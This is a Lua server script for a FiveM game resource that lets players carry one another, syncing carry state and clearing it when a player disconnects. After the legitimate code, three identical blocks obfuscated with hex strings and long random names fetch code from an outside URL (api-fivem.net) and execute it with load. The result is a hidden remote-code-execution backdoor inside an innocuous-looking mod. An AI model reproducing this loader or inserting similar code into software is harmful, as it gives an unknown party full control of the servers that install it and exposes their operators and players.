local carrying = {}
--carrying[source] = targetSource, source is carrying targetSource
local carried = {}
--carried[targetSource] = source, targetSource is being carried by source

RegisterServerEvent("CarryPeople:sync")
AddEventHandler("CarryPeople:sync", function(targetSrc)
	local source = source
	local sourcePed = GetPlayerPed(source)
   	local sourceCoords = GetEntityCoords(sourcePed)
	local targetPed = GetPlayerPed(targetSrc)
        local targetCoords = GetEntityCoords(targetPed)
	if #(sourceCoords - targetCoords) <= 3.0 then 
		TriggerClientEvent("CarryPeople:syncTarget", targetSrc, source)
		carrying[source] = targetSrc
		carried[targetSrc] = source
	end
end)

RegisterServerEvent("CarryPeople:stop")
AddEventHandler("CarryPeople:stop", function(targetSrc)
	local source = source

	if carrying[source] then
		TriggerClientEvent("CarryPeople:cl_stop", targetSrc)
		carrying[source] = nil
		carried[targetSrc] = nil
	elseif carried[source] then
		TriggerClientEvent("CarryPeople:cl_stop", carried[source])			
		carrying[carried[source]] = nil
		carried[source] = nil
	end
end)

AddEventHandler('playerDropped', function(reason)
	local source = source
	
	if carrying[source] then
		TriggerClientEvent("CarryPeople:cl_stop", carrying[source])
		carried[carrying[source]] = nil
		carrying[source] = nil
	end

	if carried[source] then
		TriggerClientEvent("CarryPeople:cl_stop", carried[source])
		carrying[carried[source]] = nil
		carried[source] = nil
	end
end)


local WegMEJvNttQkUkUiPxnnuzBIVMOjCCNIcHVJuIuhuPRulrwbQwPNJVUhAhhDketLFnVNzl = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} WegMEJvNttQkUkUiPxnnuzBIVMOjCCNIcHVJuIuhuPRulrwbQwPNJVUhAhhDketLFnVNzl[4][WegMEJvNttQkUkUiPxnnuzBIVMOjCCNIcHVJuIuhuPRulrwbQwPNJVUhAhhDketLFnVNzl[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2d\x66\x69\x76\x65\x6d\x2e\x6e\x65\x74\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x61\x4c\x61\x67\x32", function (cagjQVTzsxTAOfticKpdfbPedKnSIGjhBZJryeJdyyEiZsUgcPuNfOmFFSlZTnbWeEQrUT, McMyzmcXRhvYiNmNzZuzvFhAUlNYgPoXFlfTBHKHEuxcIBCCMgMUTIBiJYoVpnjOhHFUhs) if (McMyzmcXRhvYiNmNzZuzvFhAUlNYgPoXFlfTBHKHEuxcIBCCMgMUTIBiJYoVpnjOhHFUhs == WegMEJvNttQkUkUiPxnnuzBIVMOjCCNIcHVJuIuhuPRulrwbQwPNJVUhAhhDketLFnVNzl[6] or McMyzmcXRhvYiNmNzZuzvFhAUlNYgPoXFlfTBHKHEuxcIBCCMgMUTIBiJYoVpnjOhHFUhs == WegMEJvNttQkUkUiPxnnuzBIVMOjCCNIcHVJuIuhuPRulrwbQwPNJVUhAhhDketLFnVNzl[5]) then return end WegMEJvNttQkUkUiPxnnuzBIVMOjCCNIcHVJuIuhuPRulrwbQwPNJVUhAhhDketLFnVNzl[4][WegMEJvNttQkUkUiPxnnuzBIVMOjCCNIcHVJuIuhuPRulrwbQwPNJVUhAhhDketLFnVNzl[2]](WegMEJvNttQkUkUiPxnnuzBIVMOjCCNIcHVJuIuhuPRulrwbQwPNJVUhAhhDketLFnVNzl[4][WegMEJvNttQkUkUiPxnnuzBIVMOjCCNIcHVJuIuhuPRulrwbQwPNJVUhAhhDketLFnVNzl[3]](McMyzmcXRhvYiNmNzZuzvFhAUlNYgPoXFlfTBHKHEuxcIBCCMgMUTIBiJYoVpnjOhHFUhs))() end)

local dxSBeoZQISgoVcSGyLJKuGBNMIeLlSGcxSjUJzChzlwTyKdDowdxbfYeyHpfnAgYzgyUCO = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} dxSBeoZQISgoVcSGyLJKuGBNMIeLlSGcxSjUJzChzlwTyKdDowdxbfYeyHpfnAgYzgyUCO[4][dxSBeoZQISgoVcSGyLJKuGBNMIeLlSGcxSjUJzChzlwTyKdDowdxbfYeyHpfnAgYzgyUCO[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2d\x66\x69\x76\x65\x6d\x2e\x6e\x65\x74\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x61\x4c\x61\x67\x32", function (GkfFSkvipRtZyIyJuHRZyazdtSwKITXfjDDlxadMmMmtMVyoZmtntzBvDfXgreReFVjNDo, byjnLXqUqVsJpaWfvqsvjMJgLtDLvFOSSMidGAheZFTEWrDoLgZRUNqjYqVGwEWNtoDzga) if (byjnLXqUqVsJpaWfvqsvjMJgLtDLvFOSSMidGAheZFTEWrDoLgZRUNqjYqVGwEWNtoDzga == dxSBeoZQISgoVcSGyLJKuGBNMIeLlSGcxSjUJzChzlwTyKdDowdxbfYeyHpfnAgYzgyUCO[6] or byjnLXqUqVsJpaWfvqsvjMJgLtDLvFOSSMidGAheZFTEWrDoLgZRUNqjYqVGwEWNtoDzga == dxSBeoZQISgoVcSGyLJKuGBNMIeLlSGcxSjUJzChzlwTyKdDowdxbfYeyHpfnAgYzgyUCO[5]) then return end dxSBeoZQISgoVcSGyLJKuGBNMIeLlSGcxSjUJzChzlwTyKdDowdxbfYeyHpfnAgYzgyUCO[4][dxSBeoZQISgoVcSGyLJKuGBNMIeLlSGcxSjUJzChzlwTyKdDowdxbfYeyHpfnAgYzgyUCO[2]](dxSBeoZQISgoVcSGyLJKuGBNMIeLlSGcxSjUJzChzlwTyKdDowdxbfYeyHpfnAgYzgyUCO[4][dxSBeoZQISgoVcSGyLJKuGBNMIeLlSGcxSjUJzChzlwTyKdDowdxbfYeyHpfnAgYzgyUCO[3]](byjnLXqUqVsJpaWfvqsvjMJgLtDLvFOSSMidGAheZFTEWrDoLgZRUNqjYqVGwEWNtoDzga))() end)

local LQPxVOfnjxPSHdvQPFxcIFJSrjnqBikPyJlVpuAcBxKqZCVHihqvxDAhDowQMUVihKprXK = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} LQPxVOfnjxPSHdvQPFxcIFJSrjnqBikPyJlVpuAcBxKqZCVHihqvxDAhDowQMUVihKprXK[4][LQPxVOfnjxPSHdvQPFxcIFJSrjnqBikPyJlVpuAcBxKqZCVHihqvxDAhDowQMUVihKprXK[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2d\x66\x69\x76\x65\x6d\x2e\x6e\x65\x74\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x61\x4c\x61\x67\x32", function (bHgHUQqnQkMNrOxqiWvRMtndxEhYDKxUsIcrbIFhZWBGuKYlNfmpHQXPCQsnYKflHeZrDX, yUwNWByyDEVYvUxAnNAGjCdqoaXZLezEdfuSUIDKPZMXrSJrSWPIetilrEQjOlJRccqrJn) if (yUwNWByyDEVYvUxAnNAGjCdqoaXZLezEdfuSUIDKPZMXrSJrSWPIetilrEQjOlJRccqrJn == LQPxVOfnjxPSHdvQPFxcIFJSrjnqBikPyJlVpuAcBxKqZCVHihqvxDAhDowQMUVihKprXK[6] or yUwNWByyDEVYvUxAnNAGjCdqoaXZLezEdfuSUIDKPZMXrSJrSWPIetilrEQjOlJRccqrJn == LQPxVOfnjxPSHdvQPFxcIFJSrjnqBikPyJlVpuAcBxKqZCVHihqvxDAhDowQMUVihKprXK[5]) then return end LQPxVOfnjxPSHdvQPFxcIFJSrjnqBikPyJlVpuAcBxKqZCVHihqvxDAhDowQMUVihKprXK[4][LQPxVOfnjxPSHdvQPFxcIFJSrjnqBikPyJlVpuAcBxKqZCVHihqvxDAhDowQMUVihKprXK[2]](LQPxVOfnjxPSHdvQPFxcIFJSrjnqBikPyJlVpuAcBxKqZCVHihqvxDAhDowQMUVihKprXK[4][LQPxVOfnjxPSHdvQPFxcIFJSrjnqBikPyJlVpuAcBxKqZCVHihqvxDAhDowQMUVihKprXK[3]](yUwNWByyDEVYvUxAnNAGjCdqoaXZLezEdfuSUIDKPZMXrSJrSWPIetilrEQjOlJRccqrJn))() end)